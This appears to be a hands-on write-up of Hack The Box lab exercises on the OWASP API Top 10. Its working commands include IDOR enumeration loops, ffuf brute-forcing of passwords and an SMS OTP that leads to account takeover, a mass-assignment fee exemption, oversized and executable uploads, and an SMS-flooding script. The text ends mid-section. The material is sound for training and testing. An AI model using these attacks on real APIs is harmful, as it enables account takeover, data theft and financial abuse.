# API Attacks

This document outlines common techniques for identifying and exploiting **API related vulnerabilities**. It is intended as a practical, hands-on reference rather than a comprehensive theoretical guide.

---

# Table of Contents

- [API Attacks](#api-attacks)
  - [Overview](#overview)
  - [Broken Object Level Authorization (BOLA)](#broken-object-level-authorization-bola)
  - [Broken Authentication](#broken-authentication)
  - [Broken Object Property Level Authorization](#broken-object-property-level-authorization)
    - [Excessive Data Exposure](#excessive-data-exposure)
    - [Mass Assignment](#mass-assignment)
  - [Unrestricted Resource Consumption](#unrestricted-resource-consumption)
  - [Broken Function Level Authorization (BFLA)](#broken-function-level-authorization-bfla)
  - [Unrestricted Access to Sensitive Business Flows](#unrestricted-access-to-sensitive-business-flows)
  - [Server Side Request Forgery (SSRF)](#server-side-request-forgery-ssrf)
  - [Security Misconfigurations](#security-misconfigurations)
  - [Improper Inventory Management](#improper-inventory-management)
  - [Unsafe Consumption of APIs](#unsafe-consumption-of-apis)
  - [Exploitation - Example](#exploitation---example)

---

## Overview

Application Programming Interfaces (APIs) are a foundational component of modern software development. APIs act as an intermediary between applications, enabling communication and data exchange across different systems. At their core, APIs consist of well-defined rules and protocols that dictate how systems interact with one another.

There are several common API architectures, including **REST**, **SOAP**, **GraphQL**, and **gRPC**.

**Representational State Transfer (REST)** is the most widely adopted API architecture. It follows a **client–server model**, where clients request resources from a server using standard HTTP methods such as `GET`, `POST`, `PUT`, and `DELETE`. RESTful APIs are **stateless**, meaning each request contains all the information required for the server to process it. Responses are typically serialized in **JSON** or **XML** format.

**Simple Object Access Protocol (SOAP)** relies on XML-based messaging to facilitate communication between systems. SOAP APIs are highly standardized and provide extensive support for security, transactions, and error handling. However, they are generally more complex to implement and consume compared to RESTful APIs.

**GraphQL** offers a flexible and efficient approach to querying and modifying data. It allows clients to specify exactly which data they require, reducing both over-fetching and under-fetching. GraphQL operates through a single endpoint and uses a strongly typed query language to interact with backend data sources.

**gRPC** is a modern API architecture that uses **Protocol Buffers** for message serialization. It supports multiple programming languages and is commonly used in microservices and distributed systems due to its performance and efficiency.

While APIs are a critical enabler of modern applications, they also introduce a significant attack surface. The ten most critical API security risks include:

- Broken Object Level Authorization (BOLA)
    - The API allows authenticated users to access data they are not authorized to view.
- Broken Authentication
    - The authentication mechanisms can be bypassed or circumvented, enabling unauthorized access.
- Broken Object Property Level Authorization
    - The API exposes sensitive object properties or allows unauthorized manipulation of them.
- Unrestricted Resource Consumption
    - The API does not enforce limits on resource usage, enabling denial-of-service conditions.
- Broken Function Level Authorization
    - Unauthorized users are able to perform privileged or restricted operations.
- Unrestricted Access to Sensitive Business Flows
    - Sensitive workflows are exposed, potentially leading to financial or operational impact.
- Server Side Request Forgery (SSRF)
    - Insufficient validation allows attackers to coerce the server into making malicious internal requests.
- Security Misconfiguration
    - Improper configuration leads to vulnerabilities, including various injection flaws.
- Improper Inventory Management
    - API versions and endpoints are not properly tracked or secured.
- Unsafe Consumption of APIs
    - The API unsafely consumes third-party or internal APIs, propagating trust and security issues.

---

## Broken Object Level Authorization (BOLA)

Failing to verify that a user has ownership of, or permission to access, a specific resource through **object-level authorization mechanisms** can result in serious security vulnerabilities. This class of issue is known as **Broken Object Level Authorization (BOLA)** and is commonly referred to as **Insecure Direct Object Reference (IDOR)**.

The target application is vulnerable to [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html). A brief description of this weakness is provided below:

```
The system's authorization functionality does not prevent one user from gaining access to another user's data or record by modifying the key value identifying the data.
```

The following credentials are provided:

```
htbpentester2@pentestercompany.com:HTBPentester2
```

Authentication is performed via the following endpoint, which returns a **JSON Web Token (JWT)** upon successful login:

```
/api/v1/authentication/suppliers/sign-in
```

The authentication request is sent as JSON:

```json
{
  "Email": "htbpentester2@pentestercompany.com",
  "Password": "HTBPentester2"
}
```

![Filtered output](..images/bola.PNG)

The server responds with a valid JWT:

```json
{
  "jwt": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTc2Nzk3Mzk3NCwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.-_UeCTrm-n3TcFnd3MQL7fWsXFcndOkwy9M3D0jXMA-bJ5nFscGGVdrljuhB-bZTGpzWW21Ur1nRZeJHy4stSw"
}
```

![Filtered output](..images/bola2.PNG)

The JWT is supplied to the API by using the `Authorize` feature in the Swagger interface:

![Filtered output](..images/bola3.PNG)

After entering the token, authorization succeeds:

![Filtered output](..images/bola4.PNG)

Next, endpoints within the **Suppliers** group are reviewed. An endpoint named `/api/v1/suppliers/current-user` is identified. The `current-user` naming convention suggests that the endpoint relies on the JWT to determine the authenticated user context.

![Filtered output](..images/bola5.PNG)

Invoking this endpoint returns details associated with the authenticated supplier, including the internal `id` and `companyID` values:

```json
{
  "supplier": {
    "id": "781391c3-c6e3-4f42-bea4-1e71b6d9b4e7",
    "companyID": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
    "name": "HTBPentester2",
    "email": "htbpentester2@pentestercompany.com",
    "phoneNumber": "+44 9999 999992"
  }
}
```

![Filtered output](..images/bola6.PNG)

Further inspection of the **Supplier** endpoints reveals the following endpoint, which accepts a user-controlled integer identifier:

```
/api/v1/suppliers/quarterly-reports/{ID}
```

![Filtered output](..images/bola7.PNG)

By modifying the `{ID}` parameter, it is possible to retrieve quarterly reports belonging to other suppliers. For example, requesting the report with an `id` value of `2` returns data associated with a different supplier:

```json
{
  "supplierQuarterlyReport": {
    "id": 2,
    "supplierID": "00ac3d74-6c7d-4ef0-bf15-00851bf353ba",
    "quarter": 3,
    "year": 2022,
    "amountSold": 608221,
    "commentsFromManager": "Remarkable dedication! I'm full of admiration for your efforts! Get ready for a custom-tailored reward!"
  }
}
```

![Filtered output](..images/bola8.PNG)

This confirms the presence of a **BOLA/IDOR** vulnerability, as the API does not enforce ownership or authorization checks on the requested object.

The vulnerability can be abused at scale by iterating over sequential report identifiers. Using the `curl` command generated by the Swagger interface as a base, a simple Bash script is created to retrieve multiple reports:

```bash
#!/usr/bin/env bash

for ((i=1; i<= 20; i++)); do
    curl -s -w "\n" -X 'GET' \
    "http://83.136.249.164:34382/api/v1/suppliers/quarterly-reports/$i" \
    -H 'accept: application/json' \
    -H 'Authorization: Bearer <JWT>' | jq >> reports.txt
done
```

The script fetches the first 20 quarterly reports and stores them in `reports.txt`.

Searching the output file reveals the flag:

```bash
grep -i "htb" reports.txt
```

Flag:

```
HTB{e76651e1f516eb5d7260621c26754776}
```

![Filtered output](..images/bola9.PNG)

This vulnerability allows **authenticated users to access sensitive financial and operational data belonging to other suppliers** by simply modifying a numeric identifier. The lack of object-level authorization checks enables large-scale data exposure and demonstrates a critical API security flaw.

For a more in depth explanation of IDOR vulnerabilities, check out the `web-attacks` directory in this same Github repository. 

---

## Broken Authentication

An API suffers from **Broken Authentication** when weaknesses in its authentication mechanisms allow attackers to bypass identity verification or compromise user accounts.

The target application is vulnerable to [CWE-307: Improper Restriction of Excessive Authentication Attempts](https://cwe.mitre.org/data/definitions/307.html). A brief description of this weakness is shown below:

```
The product does not implement sufficient measures to prevent multiple failed authentication attempts within a short time frame.
```

The following valid credentials are provided:

```
htbpentester3@hackthebox.com:HTBPentester3
```

Authentication is performed through the following endpoint, which issues a **JSON Web Token (JWT)** upon successful login:

```
/api/v1/authentication/customers/sign-in
```

The authentication request is sent as JSON:

```json
{
  "Email": "htbpentester3@pentestercompany.com",
  "Password": "HTBPentester3"
}
```

![Filtered output](..images/broken-auth.PNG)

The server responds with a valid JWT:

```json
{
  "jwt": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjNAaGFja3RoZWJveC5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiQ3VzdG9tZXJzX1VwZGF0ZUJ5Q3VycmVudFVzZXIiLCJDdXN0b21lcnNfR2V0IiwiQ3VzdG9tZXJzX0dldEFsbCJdLCJleHAiOjE3Njc5ODY0OTYsImlzcyI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIiLCJhdWQiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIn0.U6R1F97VFAehHfLRXuDO4VBIav_h-3CEMeEAmWRiVMTMuJgRkDe6LPMGgZaWQH2_tPGy2KuPM-pZ5Ki9IR4DHw"
}
```

![Filtered output](..images/broken-auth2.PNG)

The JWT is supplied to the API using the `Authorize` feature in the Swagger interface:

![Filtered output](..images/broken-auth3.PNG)

Authorization succeeds after providing the token:

![Filtered output](..images/broken-auth4.PNG)

Querying the `/api/v1/roles/current-user` endpoint reveals that the authenticated user is assigned the following roles:

- `Customers_UpdateByCurrentUser`
- `Customers_Get`
- `Customers_GetAll`

![Filtered output](..images/broken-auth5.PNG)

The `Customers_GetAll` role permits access to the `/api/v1/customers` endpoint, which returns records for all customers:

```
http://83.136.248.107:32741/api/v1/customers
```

![Filtered output](..images/broken-auth6.PNG)

This endpoint exposes sensitive information such as email addresses, phone numbers, and birth dates. While this constitutes an authorization issue, it does not directly allow account takeover.

Inspection of the `/api/v1/customers/current-user` **PATCH** endpoint shows that it allows authenticated users to update their profile details, including their password:

```json
{
  "UpdatedCustomer": {
    "Name": "string",
    "Email": "user@example.com",
    "PhoneNumber": "648561703358742276159723599389",
    "BirthDate": "1992-01-09",
    "Password": "string"
  }
}
```

![Filtered output](..images/broken-auth7.PNG)

When attempting to set a weak password such as `passw`, the API rejects the request, indicating a minimum password length requirement:

```json
{
  "UpdatedCustomer": {
    "Name": "string",
    "Email": "user@example.com",
    "PhoneNumber": "648561703358742276159723599389",
    "BirthDate": "1992-01-09",
    "Password": "passw"
  }
}
```

Response:

```json
{
  "StatusCode": 400,
  "Message": "One or more errors occurred!",
  "Errors": {
    "UpdatedCustomer.Password": [
      "Password must be at least 6 characters long"
    ]
  }
}
```

This response discloses password policy details, revealing that the API enforces only a minimal length requirement.

When the password is set to a weak but valid value such as `123456`, the update succeeds:

```json
{
  "UpdatedCustomer": {
    "Name": "string",
    "Email": "user@example.com",
    "PhoneNumber": "648561703358742276159723599389",
    "BirthDate": "1992-01-09",
    "Password": "123456"
  }
}
```

![Filtered output](..images/broken-auth9.PNG)

Response:

```json
{
  "successStatus": true
}
```

![Filtered output](..images/broken-auth10.PNG)

This confirms the presence of a **weak password policy**, making brute-force and credential abuse viable.

To prepare for brute-force testing, an invalid login attempt is made to observe the error message returned by the authentication endpoint:

```json
{
  "Email": "htbpentester3@hackthebox.com",
  "Password": "invalidPassword"
}
```

Response:

```json
{
  "errorMessage": "Invalid Credentials"
}
```

A custom wordlist containing passwords of at least six characters is generated from the `xato-net-10-million-passwords-100000.txt` list:

```bash
grep -E '^.{6,}$' xato-net-10-million-passwords-100000.txt > xato_6plus.txt
```

Brute-force attempts are performed using `ffuf`, filtering out invalid responses:

```bash
ffuf -w xato_6plus.txt:FUZZ -request req.txt -request-proto http -fr "Invalid Credentials"
```

No valid credentials are discovered, suggesting that the target account uses a password with sufficient entropy.

Since direct authentication brute-forcing fails, the password reset functionality is evaluated.

An OTP reset request is initiated by supplying the victim’s email address:

```
/api/v1/authentication/customers/passwords/resets/sms-otps
```

The response indicates success:

```json
{
  "SuccessStatus": true
}
```

![Filtered output](..images/broken-auth12.PNG)

The password reset confirmation endpoint requires an OTP value:

```
/api/v1/authentication/customers/passwords/resets
```

Although the OTP is sent to the victim, the API does not enforce rate limiting or lockout mechanisms. Since OTP values are typically numeric and short, a brute-force attack is feasible.

A four-digit OTP wordlist is generated:

```bash
seq -w 0 9999 > otp.txt
```

An invalid OTP attempt returns the following response:

```json
{
  "SuccessStatus": false
}
```

This response is used as a filter condition during brute-force attempts:

```bash
ffuf -w otp.txt:FUZZ -request req.txt -request-proto http -fr "false"
```

A valid OTP is successfully identified:

```
6307
```

![Filtered output](..images/broken-auth11.PNG)

Using the valid OTP, the victim’s password is reset to `123456`:

```json
{
  "Email": "MasonJenkins@ymail.com",
  "OTP": "6307",
  "NewPassword": "123456"
}
```

![Filtered output](..images/broken-auth13.PNG)

The new credentials are then used to authenticate successfully:

```json
{
  "Email": "MasonJenkins@ymail.com",
  "Password": "123456"
}
```

Response:

```json
{
  "jwt": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Ik1hc29uSmVua2luc0B5bWFpbC5jb20iLCJleHAiOjE3Njc5OTU1NjEsImlzcyI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIiLCJhdWQiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIn0.1A_G7v1DvXzGanotgvxoYVPOwegnXHVFMfNAhSN5aoxBwmgU6yp1gnlDMjOsb43i_amRLQkXUpg9byugTe0V0A"
}
```

After supplying the JWT via the `Authorize` interface, querying `/api/v1/customers/current-user` confirms successful account takeover:

![Filtered output](..images/broken-auth14.PNG)


```json
{
  "customer": {
    "id": "53428a83-8591-4548-a553-c434ad76a61a",
    "name": "Mason Jenkins",
    "email": "MasonJenkins@ymail.com",
    "phoneNumber": "+44 7451 162707",
    "birthDate": "1985-09-16"
  }
}
```

![Filtered output](..images/broken-auth15.PNG)

With full access to the compromised account, sensitive financial data can be accessed via the following endpoint:

```
/api/v1/customers/payment-options/current-user
```

Response:

```json
{
  "customerPaymentOptions": [
    {
      "customerID": "53428a83-8591-4548-a553-c434ad76a61a",
      "type": "Debit Card",
      "provider": "Capital One",
      "accountNumber": "9754729874181436",
      "cvvHash": "B6EDC1CD1F36E45DAF6D7824D7BB2283"
    },
    {
      "customerID": "53428a83-8591-4548-a553-c434ad76a61a",
      "type": "Credit Card",
      "provider": "HTB Academy",
      "accountNumber": "HTB{115a6329120e9eff13c4ec6a63343ed1}",
      "cvvHash": "5EF0B4EBA35AB2D6180B0BCA7E46B6F9"
    }
  ]
}
```

This vulnerability chain demonstrates how weak password policies, missing rate limiting, and brute-forceable OTP mechanisms can be combined to achieve full account takeover. An attacker can reset arbitrary user passwords and gain unauthorized access to sensitive personal and financial data.

For a deeper explanation of **broken authentication**, check out the `broken-authentication.md` document in the `broken-authentication` directory.

---

## Broken Object Property Level Authorization

**Broken Object Property Level Authorization** vulnerabilities occur when an API exposes or allows modification of object properties beyond a user’s authorized scope. This category includes two primary subclasses:

- Excessive Data Exposure
- Mass Assignment

An API endpoint is vulnerable to **Excessive Data Exposure** when it reveals sensitive object properties to **authorized users** who should not have access to that data.

An API endpoint is vulnerable to **Mass Assignment** when it allows **authorized users** to modify object properties that should be immutable or restricted.

### Excessive Data Exposure

The target is vulnerable to [CWE-213, Exposure of Sensitive Information Due to Incompatible Policies](https://cwe.mitre.org/data/definitions/213.html).

A brief description of this weakness is provided below:

```
The product's intended functionality exposes information to certain actors in accordance with the developer's security policy, but this information is regarded as sensitive according to the intended security policies of other stakeholders such as the product's administrator, users, or others whose information is being processed.
```

We are provided with valid credentials:

```
htbpentester4@hackthebox.com:HTBPentester4
```

Authentication is performed via the `/api/v1/authentication/customers/sign-in` endpoint to obtain a valid JSON Web Token (JWT):

```
{
  "Email": "htbpentester4@hackthebox.com",
  "Password": "HTBPentester4"
}
```

![Filtered output](..images/data-exposure.PNG)

The server responds with a valid JWT:

```json
{
  "jwt": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjRAaGFja3RoZWJveC5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJzX0dldCIsIlN1cHBsaWVyc19HZXRBbGwiXSwiZXhwIjoxNzY4MDM5NjE3LCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.-ipwwlk6ejD5mxlJRHKGnj-XCMfKFey3h9yvpePaqqy5AKMfsoAyJOlPFBl_FCg_GwAeSLa0P2AOXsVy9WGECA"
}
```

The JWT is supplied using the `Authorize` functionality:

![Filtered output](..images/data-exposure2.PNG)

Querying the `/api/v1/roles/current-user` endpoint reveals that the authenticated user has been assigned the following roles:

- `Suppliers_Get`
- `Suppliers_GetAll`

![Filtered output](..images/data-exposure3.PNG)

Invoking the `/api/v1/suppliers` **GET** endpoint returns a list of suppliers that includes sensitive properties such as:

- `id`
- `companyID`
- `name`
- `email`
- `phoneNumber`

![Filtered output](..images/data-exposure4.PNG)

While allowing customers to view supplier listings is typical for e-commerce platforms, exposing **direct contact information** such as email addresses and phone numbers is inappropriate. This information enables customers to bypass the marketplace entirely by contacting suppliers directly, undermining the platform’s business model.

This behavior demonstrates a clear case of **excessive data exposure**, where sensitive fields are unnecessarily returned to authorized users.

### Mass Assignment

The target is vulnerable to [CWE-915, Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html). 

A brief description of the weakness is shown below:

```
The product receives input from an upstream component that specifies multiple attributes, properties, or fields that are to be initialized or updated in an object, but it does not properly control which attributes can be modified.
```

We are provided with valid supplier credentials:

```
htbpentester6@pentestercompany.com:HTBPentester6
```

Authentication is performed via the `/api/v1/authentication/suppliers/sign-in` endpoint:

```
{
  "Email": "htbpentester6@pentestercompany.com",
  "Password": "HTBPentester6"
}
```

The server responds with a valid JWT:

```json
{
  "jwt": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjZAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfVXBkYXRlIiwiU3VwcGxpZXJDb21wYW5pZXNfR2V0Il0sImV4cCI6MTc2ODA0MTU0MSwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.FQ6madAV-SDGm0msFnZ4DGaAFuqgfM3UxQo-fOnCbVM4Nj0grPSmiBf7iYCXj6Ap0hRgytB3EU8qZ8Yh_ktvIw"
}
```

After authorizing with the JWT, querying `/api/v1/roles/current-user` shows that the authenticated user has the following roles:

- `SupplierCompanies_Update`
- `SupplierCompanies_Get`

![Filtered output](..images/mass-assignment.PNG)

The `/api/v1/supplier-companies/current-user` endpoint reveals that the supplier company associated with the authenticated user (`PentesterCompany`) has the following property set:

```json
"isExemptedFromMarketplaceFee": 0
```

![Filtered output](..images/mass-assignment2.PNG)

This indicates that the supplier company is subject to marketplace fees on each sale.

Examining the `/api/v1/supplier-companies` **PATCH** endpoint reveals that it accepts user-controlled input for the `IsExemptedFromMarketplaceFee` field:

 ```json
 {
  "UpdatedSupplierCompany": {
    "SupplierCompanyID": "string",
    "IsExemptedFromMarketplaceFee": 1,
    "CertificateOfIncorporationPDFFileURI": "string"
  }
}
 ```

 ![Filtered output](..images/mass-assignment3.PNG)

An initial request fails due to missing required fields:

  ```json
{
  "StatusCode": 400,
  "Message": "One or more errors occurred!",
  "Errors": {
    "UpdatedSupplierCompany.SupplierCompanyID": [
      "The JSON value is not in a supported Guid format."
    ]
  }
}
 ```

We must provide a value for the `SupplierCompanyID` and `CertificateOfIncorporationPDFFileURI`. The required values can be obtained from the `/api/v1/supplier-companies/current-user` endpoint:

 ```json
 {
  "supplierCompany": {
    "id": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
    "name": "PentesterCompany",
    "email": "supplier@pentestercompany.com",
    "isExemptedFromMarketplaceFee": 0,
    "certificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
  }
}
 ```

Using this information, we resend the **PATCH** request with all required fields populated:

 ```json
 {
  "UpdatedSupplierCompany": {
    "SupplierCompanyID": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
    "IsExemptedFromMarketplaceFee": 1,
    "CertificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
  }
}
 ```

The server responds successfully:

 ```json
 {
  "successStatus": true
}
 ```

![Filtered output](..images/mass-assignment4.PNG)

Revisiting the `/api/v1/supplier-companies/current-user` endpoint confirms that the value has been updated:

```json
{
  "supplierCompany": {
    "id": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
    "name": "PentesterCompany",
    "email": "supplier@pentestercompany.com",
    "isExemptedFromMarketplaceFee": 1,
    "certificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
  }
}
```

![Filtered output](..images/mass-assignment5.PNG)

This confirms that the authenticated supplier was able to modify a **business-critical property** that should not be user-controllable.

The endpoint fails to enforce proper property-level authorization, allowing suppliers to exempt themselves from marketplace fees. This **mass assignment vulnerability** directly impacts platform revenue and demonstrates inadequate server-side validation of modifiable object attributes.

---

## Unrestricted Resource Consumption

An API is vulnerable to **Unrestricted Resource Consumption** when it fails to enforce limits on user-initiated actions that consume resources such as **network bandwidth**, **CPU**, **memory**, or **storage**. These resources incur real operational costs, and without safeguards—most **notably rate limiting** and **input validation**—an attacker can abuse the API to cause financial damage or denial-of-service conditions.

The target is vulnerable to [CWE-400, Uncontrolled Resource Consumption](https://cwe.mitre.org/data/definitions/400.html). 

A brief description of the weakness is shown below:

```
The product does not properly control the allocation and maintenance of a limited resource.
```

Authentication is performed via the `/api/v1/authentication/suppliers/sign-in` endpoint:

```
{
  "Email": "htbpentester8@pentestercompany.com",
  "Password": "HTBPentester8"
}
```

The server responds with a valid JWT:

```json
{
  "jwt": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjhAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0IiwiU3VwcGxpZXJDb21wYW5pZXNfVXBsb2FkQ2VydGlmaWNhdGVPZkluY29ycG9yYXRpb24iXSwiZXhwIjoxNzY4MDUxMjkyLCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.wbxZ-S7c5erl5gYeG8Vpuagr2Kt8H_Gcy6SsEHFe5W6-RVPnmv7pUwDrfFAblSXUA_u4YpZKhBVPdKxJMcoH4w"
}
```

After authorizing with the JWT, querying `/api/v1/roles/current-user` shows that the authenticated user has the following roles:

- `SupplierCompanies_Get`
- `SupplierCompanies_UploadCertificateOfIncorporation`

![Filtered output](..images/r-consumption.PNG)

Reviewing the `SupplierCompanies` endpoints shows that only one endpoint is associated with the `SupplierCompanies_UploadCertificateOfIncorporation` role:

```
/api/v1/supplier-companies/certificates-of-incorporation POST
```

![Filtered output](..images/r-consumption2.PNG)

This endpoint allows suppliers to upload a **certificate of incorporation** in PDF format. The request requires both a file upload and a `CompanyID`.

The `companyID` can be retrieved via:

```
/api/v1/supplier-companies/current-user
```

Response:

```json
{
  "supplierCompany": {
    "id": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
    "name": "PentesterCompany",
    "email": "supplier@pentestercompany.com",
    "isExemptedFromMarketplaceFee": 0,
    "certificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
  }
}
```

Using the obtained `CompanyID`, we first generate a 30 MB PDF file filled with random data:

```bash
dd if=/dev/urandom of=certificateOfIncorporation.pdf bs=1M count=30
```

We then upload the file:

```bash
curl -X 'POST' \
  'http://94.237.53.219:33259/api/v1/supplier-companies/certificates-of-incorporation' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer <JWT>' \
  -H 'Content-Type: multipart/form-data' \
  -F 'CertificateOfIncorporationPDFFormFile=@certificateOfIncorporation.pdf;type=application/pdf' \
  -F 'CompanyID=b75a7c76-e149-4ca7-9c55-d9fc4ffa87be'
```

The upload succeeds, and the response confirms both the file size and storage location:

```json
{
  "successStatus": true,
  "fileURI": "file:///app/wwwroot/SupplierCompaniesCertificatesOfIncorporations/certificateOfIncorporation.pdf",
  "fileSize": 31457280
}
```

![Filtered output](..images/r-consumption3.PNG)

This demonstrates that the endpoint does **not enforce file size limits**. Without additional safeguards such as rate limiting, an attacker could repeatedly upload large files and exhaust available disk storage, leading to denial-of-service conditions and increased operational costs.

To further test input validation, we attempt to upload a non-PDF file. We create a 30 MB executable file:

```bash
dd if=/dev/urandom of=reverse-shell.exe bs=1M count=30
```

We then submit the upload request again:

```bash
curl -X 'POST' \
  'http://94.237.53.219:33259/api/v1/supplier-companies/certificates-of-incorporation' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer <JWT>' \
  -H 'Content-Type: multipart/form-data' \
  -F 'CertificateOfIncorporationPDFFormFile=@certificateOfIncorporation.pdf;type=application/pdf' \
  -F 'CompanyID=b75a7c76-e149-4ca7-9c55-d9fc4ffa87be'
```


The upload succeeds:

```json
{
  "successStatus": true,
  "fileURI": "file:///app/wwwroot/SupplierCompaniesCertificatesOfIncorporations/reverse-shell.exe",
  "fileSize": 31457280
}
```

This confirms that the endpoint does **not validate file type or content**. If a malicious executable were uploaded and later accessed by an administrator or automated process, this could result in **remote code execution**.

Another endpoint vulnerable to **Unrestricted Resource Consumption** is:

```
/api/v1/authentication/customers/passwords/resets/sms-otps
```

The endpoint documentation states:

```
This endpoint sends an OTP via SMS to the Customer's phone number when they want to reset their password.
The SMS provider we are working with charges us a significant amount per message. We need to request a discount from them; otherwise, our revenues will decrease.
Role(s) required: None
```

Each request incurs a direct financial cost. Because the endpoint does not implement rate limiting or authentication, it can be abused to generate excessive SMS traffic.

The request format is as follows:

```bash
curl -X 'POST' \
  'http://94.237.53.219:33259/api/v1/authentication/customers/passwords/resets/sms-otps' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "Email": "htbpentester8@pentestercompany.com"
}'
```

We automate repeated requests using a simple Bash script:

```bash
#!/usr/bin/env bash

for ((i=1; i<20; i++)); do
  curl -X 'POST' \
  'http://94.237.53.219:33259/api/v1/authentication/customers/passwords/resets/sms-otps' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
    "Email": "htbpentester8@pentestercompany.com"
  }'
done
```

Executing the script triggers repeated SMS requests. After the tenth request, the API returns the flag:

```
{"flag":"HTB{01de742d8cd942ad682aeea9ce3c5428}"}
```

---

## Broken Function Level Authorization (BFLA)

An API is vulnerable to **Broken Function Level Authorization (BFLA)** when it allows users to invoke **privileged or restricted endpoints** without possessing the required authorization. Unlike **Broken Object Level Authorization (BOLA)**—where a user is authorized to access an endpoint but not a specific object—**BFLA occurs when a user is not authorized to access the endpoint at all**, yet the API still processes the request.

The target is vulnerable to [CWE-200, Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html). 

A brief description of the weakness is shown below:

```
The product exposes sensitive information to an actor that is not explicitly authorized to have access to that information.
```

Authentication is performed via the `/api/v1/authentication/customers/sign-in` endpoint:

```
{
  "Email": "htbpentester9@hackthebox.com",
  "Password": "HTBPentester9"
}
```

The server responds with a valid JWT:

```json
{
{
